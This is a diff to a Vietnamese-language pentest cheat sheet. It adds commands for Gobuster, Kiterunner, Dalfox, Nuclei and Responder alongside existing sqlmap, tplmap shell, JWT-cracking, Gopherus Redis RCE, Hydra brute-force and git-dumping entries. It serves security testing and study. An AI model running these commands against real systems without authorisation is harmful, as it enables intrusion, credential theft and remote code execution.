@@ -36,13 +36,23 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://<TARGET_IP>/api/users?FUZZ=test
 ```
 
+### Gobuster (Dò VHost thay thế ổn định)
+```bash
+gobuster vhost -u http://<TARGET_DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+```
+
 ### Feroxbuster (Dò tìm thư mục đệ quy cực nhanh bằng Rust)
 ```bash
 # Dò tìm đệ quy (tự động quét tiếp vào các thư mục tìm thấy) và tìm các file có đuôi cụ thể
 feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
 ```
 
-### Arjun (Tìm kiếm tham số ẩn - Hidden Parameters)
+### Kiterunner (Dò tìm API Endpoints chuyên sâu)
+```bash
+kr scan http://<TARGET_IP>/api -w /opt/kiterunner/routes-large.kite
+```
+
+### Arjun (Tìm kiếm tham số ẩn trên API/Web)
 ```bash
 # Tự động dò tìm các tham số GET hoặc POST chưa được công bố trên API endpoint
 arjun -u http://<TARGET_IP>/api/endpoint -m GET
@@ -67,6 +77,11 @@ sqlmap -u "http://<TARGET_IP>/product.php?id=1" --batch --dbs
 sqlmap -r req.txt -p username --level 3 --risk 2 --dbms=postgresql
 ```
 
+### Dalfox (Tự động hóa quét XSS)
+```bash
+dalfox url "http://<TARGET_IP>/search?q=test"
+```
+
 ### Tplmap (Tấn công Server-Side Template Injection - SSTI)
 ```bash
 # Khai thác SSTI và lấy thẳng OS Shell
@@ -88,7 +103,7 @@ python3 jwt_tool.py <TOKEN> -M pb
 python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
 ```
 
-### Gopherus (Khai thác SSRF)
+### Gopherus (Khai thác SSRF qua các dịch vụ nội bộ)
 ```bash
 # Tạo payload gopher:// để khai thác RCE qua Redis nội bộ
 gopherus --exploit redis
@@ -98,6 +113,11 @@ gopherus --exploit redis
 ```bash
 # Brute-force POST Form dựa trên thông báo lỗi "Incorrect"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"
+```
+
+### Nuclei (Quét lỗ hổng dựa trên Template)
+```bash
+nuclei -u http://<TARGET_IP> -tags cve,lfi,ssrf
 ```
 
 ## 5. Post-Exploitation & Data Extraction (Hậu khai thác & Trích xuất dữ liệu)
@@ -121,6 +141,11 @@ bash gitdumper.sh http://<TARGET_IP>/.git/ dest_folder
 
 # Trích xuất commit thành mã nguồn hoàn chỉnh
 bash extractor.sh dest_folder dest_repo
+```
+
+### Responder (Bắt NTLM Hash qua SSRF/LFI)
+```bash
+responder -I tun0 -rdw
 ```
 
 ### Netcat (Lắng nghe kết nối Reverse Shell)
